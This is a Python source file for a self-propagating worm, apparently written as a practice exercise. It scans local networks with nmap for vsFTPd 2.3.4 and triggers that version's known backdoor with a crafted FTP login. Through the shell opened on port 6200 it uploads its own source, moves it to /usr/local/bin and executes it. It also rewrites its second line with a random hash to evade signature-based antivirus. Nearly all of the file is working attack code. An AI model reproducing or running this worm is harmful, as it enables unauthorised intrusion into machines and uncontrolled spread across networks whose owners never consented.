#!/usr/bin/env python3
#
# import os
# import sys
import ifaddr
import netaddr
import nmap
import socket
import time
import random
import hashlib


def main():
    debug_message('[!] RUNNING IN DEBUG MODE')
    # Get network cards from the system
    adapters = get_adapters(ip_version=4, ignore=['lo0', 'lo', 'en0'])

    # Locate vulnerable machines on connected networks
    targets = scan_networks(adapters)

    # Exploits backdoor in vsFTPd 2.3.4 - OSVDB-73573
    # https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
    exploit(targets)


# This will fetch any available network interface on the system excluding any card located in the
# ignore list. If there are no interfaces to ignore it will try to exploit ALL interfaces including loopback interfaces.
def get_adapters(ip_version=4, ignore=[]):
    adapters = ifaddr.get_adapters()
    networks = []

    # Returns ip addresses based on IP version, default is IPv4
    for ad in adapters:
        if ad.name not in ignore:
            if ip_version != 6:
                [networks.append(n) for n in ad.ips if ':' not in n.ip[0]]
            else:
                [networks.append(n) for n in ad.ips if ':' in n.ip[0]]

    return networks


# This section requires that Nmap is installed on the infected machine.
# It is possible to rewrite this section to work with the socket module but it is outside the scope of this practice.
def scan_networks(adapters):
    scanner = nmap.PortScanner()
    targets = []

    for adapter in adapters:
        ip_address = '{}/{}'.format(adapter.ip, adapter.network_prefix)

        if DEBUG:
            debug_message('[*] Preparing to scan network on: {}'.format(adapter.nice_name))
            debug_message('[*] Calculating network based on ip {}'.format(ip_address))

        # Get the network name from adapter ip
        network = netaddr.IPAddress(netaddr.IPNetwork(ip_address).first)

        debug_message('[*] Found network {} for ip {} with CIDR {}'.format(network, adapter.ip, adapter.network_prefix))

        # Runs the following nmap command: nmap -sV -PN -T5 -p 21 <ip-address>
        result = scanner.scan(hosts='{}/{}'.format(network, adapter.network_prefix), ports='21', arguments='-sV -PN -T5')

        nodes = []

        for node in result['scan']:
            ftp_port = result['scan'][node]['tcp'][21]

            # Check for open port (tcp 21) and check if server is running the vulnerable version of vsFTPd
            if ftp_port['state'] == 'open':
                if ftp_port['product'] == 'vsftpd' and ftp_port['version'] == '2.3.4':
                    nodes.append(node)

        # The ip addresses of any vulnerable machine found are appended to the list of vulnerable machines
        if len(nodes) > 0:
            targets += nodes

        debug_message('[*] Found {} target(s)'.format(len(targets)))
    return targets


def exploit(targets):
    # Todo; add functionality to the exploitation so it works with IPv6
    for target in targets:
        # Initial Foothold on the vulnerable system
        try:
            # Connect to TCP port 21
            ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ftp.connect((target, 21))

            # Trigger the backdoor by passing the username username along with a :)
            ftp.send(b'USER letmein:)\n')
            ftp.send(b'PASS please\n')
            time.sleep(2)
            ftp.close()
            debug_message('[*] Backdoor on port 6200 triggered for host {}'.format(target))
        except Exception as e:
            debug_message('[*] Unable to successfully trigger backdoor. Exception: {}'.format(e))

        # Self replication and execution
        try:
            # Self replication is done through the backdoor shell opened by the previous try/catch block.
            # When replicating it self the worm will take it's own source code (__file__) and replace the second line
            # of the code with a random string, this is to make it harder for pattern based antivirus to catch the file.
            # When the file has been successfully replicated to the victim it is made executable
            # and then executed on the system.
            backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            backdoor.connect((target, 6200))

            # The following does not work for some reason ...
            # debug_message('[*] Looking to see if host was previously infected')
            # command = str.encode('cat /root/.harpi3s 2>&1')
            # backdoor.send(command)

            # response = backdoor.recv(1024).decode('utf-8')
            # debug_message(response, sep='')

            for line in get_self():
                command = str.encode('echo "{}" >> /tmp/har.py\n'.format(line))
                backdoor.send(command)
                debug_message('[*] Uploading payload ...')

            command = str.encode('md5sum /tmp/har.py > /root/.harpi3s')
            backdoor.send(command)

            command = str.encode('mv /tmp/har.py /usr/local/bin\n'.format(line))
            backdoor.send(command)

            command = str.encode('chmod +x /usr/local/bin/har.py\n'.format(line))
            backdoor.send(command)

            command = str.encode('python3 /usr/local/bin/har.py &\n'.format(line))
            backdoor.send(command)

            debug_message('[*] Payload uploaded and executed')

            response = backdoor.recv(1024).decode('utf-8')

            debug_message('[*] Response {}'.format(response), sep='')

            backdoor.close()
        except Exception as e:
            debug_message('[!] Failed to connect to backdoor on {}:6200'.format(target))
            debug_message(e)


# The self replication of this worm is very basic, and it is done by loading it's own file content into memory.
# Doing so could in a real-life scenario create what is known as a race condition,
# where anti-malware software could replace the contents of the file before
# it was loaded into memory and disable or corrupt the worm during it's infection stage.
def get_self():
    f = open(__file__, 'r')
    self_content = f.readlines()
    f.close()
    self_content[1] = format('#{}\n'.format(random_string()))
    return self_content


# Simple signature based antivirus bypass
# This is one of the oldest ways of changing the hashed signature of a file,
# this is currently not a proper way to protect malware but can throw off very basic antivirus.
# This will not fool behavioral analysis or more modern ways of detecting malware!
def random_string():
    salt = ''
    for i in range(0, random.randint(1, 400)):
        salt += chr(random.randint(0, 254))
    # Generate a random string based on the current UNIX time stamp and the random string generated as a salt
    output = '{}{}'.format(time.time(), salt.encode('utf-8'))

    # Hash the random string with SHA3 512.
    hashed = hashlib.sha3_512()
    hashed.update(output.encode('utf-8'))

    return hashed.hexdigest()


def debug_message(message, sep=' '):
    if DEBUG:
        print(message, sep=sep)


# This ensures that the worm only is executable through har.py and not if loaded as a module.
if __name__ == '__main__':
    DEBUG = True
    main()
